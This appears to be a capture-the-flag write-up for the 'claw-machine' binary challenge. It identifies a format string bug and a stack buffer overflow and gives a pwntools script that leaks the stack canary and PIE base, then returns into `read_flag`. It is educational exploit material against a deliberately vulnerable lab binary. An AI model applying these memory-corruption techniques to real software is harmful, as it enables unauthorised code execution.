# claw-machine

Claw machines have a notorious reputation for being challenging to win. 
But here's your chance to put your skills to the test and see if you can beat the odds. 
Give it a try and share your feedback with us!

## Solution

```sh
file claw_machine
# claw_machine: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0dcdc3f9bead6c2a31478a42c3a9e13e478a230f, not stripped

checksec --file=claw_machine
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./glibc/'

readelf -e claw_machine
# entry 0xa20
```

https://tig3rpuppet.blog/2023/10/28/hack-the-boo-2023-writeups/#claw_machine

in `fb` function:
- format string vulnerability `printf`
- stack buffer overflow `read(0, feedback, 0x5e)` reads 94 bytes into a 64-byte buffer.

`read_flag` function - ret2win

PIE (Position Independent Executable) - need to leak address of `read_flag`

Stack contains return address of `fb` which is `main+53`, can calculate offset to `read_flag`

```py
# Step 1: print return address (`main+53`) and canary.
io.recvuntil(b'Enter your name: ')
io.sendline(b'%23$p.%21$p')
 
# Get the values.
io.recvuntil(b'Thank you for giving feedback ')
values = io.recvline().split(b'.')
 
addr_main_53 = int(values[0], 16)
canary = int(values[1], 16)
 
log.info(f'Addr (main+53): {hex(addr_main_53)}')
log.info(f'Canary: {hex(canary)}')
 
# Set the offset of exe.
exe.address = addr_main_53 - (exe.symbols['main'] + 53)
 
addr_read_flag = exe.symbols["read_flag"]
log.info(f'Address of read_flag: {hex(addr_read_flag)}')

# Step 2: return into `read_flag`, fixing the canary on the way.
io.sendline(b''.join([
    b'A' * offset,
    p64(canary),
    b'B' * 8,
    p64(addr_read_flag),
]))
```
